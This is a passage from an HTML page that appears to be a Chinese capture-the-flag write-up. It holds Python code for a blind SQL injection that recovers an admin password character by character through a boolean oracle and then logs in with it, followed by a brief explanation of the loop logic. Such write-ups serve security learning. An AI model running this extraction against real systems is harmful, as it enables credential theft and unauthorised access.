class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">        <span class="keyword">if</span> oracle(session, <span class="string">f&quot;length(pw)=<span class="subst">&#123;length&#125;</span>&quot;</span>):</span><br><span class="line">            password_length = length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> password_length <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;password length was not found&quot;</span>)</span><br><span class="line"></span><br><span class="line">    password_chars = []</span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, password_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            condition = <span class="string">f&quot;ascii(substr(pw,<span class="subst">&#123;position&#125;</span>,1))=<span class="subst">&#123;code&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">if</span> oracle(session, condition):</span><br><span class="line">                password_chars.append(<span class="built_in">chr</span>(code))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;character at position <span class="subst">&#123;position&#125;</span> was not found&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(password_chars)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">session, password</span>):</span><br><span class="line">    response = session.get(</span><br><span class="line">        URL,</span><br><span class="line">        params=&#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;pw&quot;</span>: password&#125;,</span><br><span class="line">        timeout=<span class="number">10</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">        password = recover_password(session)</span><br><span class="line">        <span class="built_in">print</span>(password)</span><br><span class="line">        result = login(session, password)</span><br><span class="line">        <span class="built_in">print</span>(result.status_code)</span><br><span class="line">        <span class="built_in">print</span>(result.text)</span><br></pre></td></tr></table></figure>
+<p><code>length(pw)</code> 确定循环边界，<code>substr</code> 的位置从 1
+开始；每个字符只有在 oracle 判真时才加入结果，避免把 guest 记录误当成
+admin 记录。</p>
 
       
     </div>
